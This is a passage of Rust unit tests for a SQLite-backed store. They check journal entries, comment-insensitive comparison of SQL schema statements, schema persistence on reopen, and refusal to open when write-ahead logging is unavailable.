    assert_eq!(
        journal,
        [
            "a.md a 2026-01-01T00:00:00Z - - id-a hash-a",
            // Another item's binding at the path says nothing of this one.
            "b.bin b 2026-01-02T00:00:00Z unsure offline - -",
            "c.md c 2026-01-03T00:00:00Z carried d.md - -",
        ]
    );
}

#[test]
fn a_comment_or_a_line_break_is_no_change_of_shape() {
    assert_eq!(
        statement(
            "CREATE TABLE t (\n  -- why's\n  a TEXT, /* more\n \"here\" */ b INTEGER -- end\n)"
        ),
        statement("CREATE TABLE t (a TEXT, b INTEGER)")
    );
    assert_ne!(
        statement("CREATE TABLE t (a TEXT)"),
        statement("CREATE TABLE t (a INTEGER)")
    );
}

#[test]
fn what_a_string_or_a_quoted_name_holds_is_a_change_of_shape() {
    for (one, other) in [
        ("'porter unicode61'", "'porter  unicode61'"),
        ("'a -- b'", "'a'"),
        ("'it''s here'", "'it''shere'"),
        ("\"a b\"", "\"ab\""),
        ("`a b`", "`ab`"),
        ("[a b]", "[ab]"),
    ] {
        assert_ne!(
            statement(&format!("CREATE TABLE t (a TEXT DEFAULT {one})")),
            statement(&format!("CREATE TABLE t (a TEXT DEFAULT {other})")),
            "{one}"
        );
    }
}

#[test]
fn the_file_schema_reopens() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    {
        let conn = open(&path).unwrap();
        upsert_item(
            &conn,
            &note("n1", "a", "b", "2026-01-01T00:00:00Z"),
            None,
            &Indexing::default(),
        )
        .unwrap();
    }
    let conn = open(&path).unwrap();
    assert!(item_held(&conn, "n1").unwrap());
}

#[cfg(unix)]
#[test]
fn a_persistent_store_that_cannot_keep_its_log_is_refused_not_opened_in_another_mode() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("core.sqlite");
    // This file system's lock-less access has no shared memory, so SQLite
    // keeps the mode it had when asked for WAL.
    let nolock = Connection::open_with_flags_and_vfs(
        &path,
        rusqlite::OpenFlags::SQLITE_OPEN_READ_WRITE | rusqlite::OpenFlags::SQLITE_OPEN_CREATE,
        "unix-none",
    )
    .unwrap();
    let mode: String = nolock
        .query_row("PRAGMA journal_mode = WAL", [], |row| row.get(0))
        .unwrap();
    assert_eq!(mode, "delete", "the witness: WAL cannot be had here");
    let refused = super::open::prepare(&nolock, None);
    assert!(
        matches!(&refused, Err(CoreError::Store(message)) if message.contains("write-ahead")),
        "{refused:?}"
    );
    // An in-memory store is not held in WAL and is not refused.
    super::open_in_memory().unwrap();
    // The witness: the store opens where WAL can be had.
    super::open(&path).unwrap();
}
